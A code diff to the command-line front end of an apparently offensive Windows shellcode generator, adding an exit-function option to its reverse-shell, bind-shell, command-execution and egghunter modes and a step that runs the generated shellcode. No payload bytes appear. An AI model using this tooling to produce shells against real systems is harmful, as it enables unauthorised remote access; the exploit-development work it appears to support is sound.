@@ -5,6 +5,12 @@ from coder import bind_shell, egghunter, exec_command, reverse_shell
 from runner import load_shellcode, run_shellcode
 from stones import assemble, disassemble_and_find_bad_chars
 
+EXIT_FUNCTIONS = {
+    "process": "TerminateProcess",
+    "thread": "RtlExitUserThread",
+    "none": None,
+}
+
 
 def parse_args():
     def setup_parser():
@@ -28,10 +34,12 @@ def parse_args():
             help="Set int3 for windbg",
         )
         parser.add_argument(
-            "--no_terminate_process",
-            action="store_true",
+            "-e",
+            "--exit_func",
             required=False,
-            help="Remove TerminateProcess to shorten shellcode",
+            choices=list(EXIT_FUNCTIONS.keys()),
+            default="process",
+            help="Exit Function",
         )
         return parser
 
@@ -87,12 +95,14 @@ def parse_args():
         return egghunter_parser
 
     parser = setup_parser()
-    mode_subparsers = parser.add_subparsers(dest="mode", help="Shellcode mode")
+    mode_subparsers = parser.add_subparsers(
+        dest="mode", required=True, help="Shellcode mode"
+    )
 
-    _ = setup_reverse_parser(mode_subparsers)
-    _ = setup_bind_parser(mode_subparsers)
-    _ = setup_exec_parser(mode_subparsers)
-    _ = setup_egghunter_parser(mode_subparsers)
+    setup_reverse_parser(mode_subparsers)
+    setup_bind_parser(mode_subparsers)
+    setup_exec_parser(mode_subparsers)
+    setup_egghunter_parser(mode_subparsers)
 
     return parser.parse_args()
 
@@ -103,7 +113,7 @@ def generate_asm_code(args, bad_chars):
             args.lhost,
             args.lport,
             bad_chars=bad_chars,
-            no_terminate_process=args.no_terminate_process,
+            exit_func=EXIT_FUNCTIONS[args.exit_func],
             debug=args.use_windbg,
         )
 
@@ -111,7 +121,7 @@ def generate_asm_code(args, bad_chars):
         code = bind_shell.generate(
             args.rport,
             bad_chars=bad_chars,
-            no_terminate_process=args.no_terminate_process,
+            exit_func=EXIT_FUNCTIONS[args.exit_func],
             debug=args.use_windbg,
         )
 
@@ -119,7 +129,7 @@ def generate_asm_code(args, bad_chars):
         code = exec_command.generate(
             args.command,
             bad_chars=bad_chars,
-            no_terminate_process=args.no_terminate_process,
+            exit_func=EXIT_FUNCTIONS[args.exit_func],
             debug=args.use_windbg,
         )
 
@@ -150,7 +160,7 @@ def main():
     else:
         asm = disassemble_and_find_bad_chars(shellcode, bad_chars)
         print(asm)
-        print("\nbad chars found")
+        print("\nBad chars found")
 
     if args.run_shellcode:
         ptr = load_shellcode(shellcode)
@@ -158,6 +168,8 @@ def main():
 
         input("Press any key to execute shellcode...")
         run_shellcode(ptr)
+
+        print("Shellcode thread terminated")
 
 
 if __name__ == "__main__":
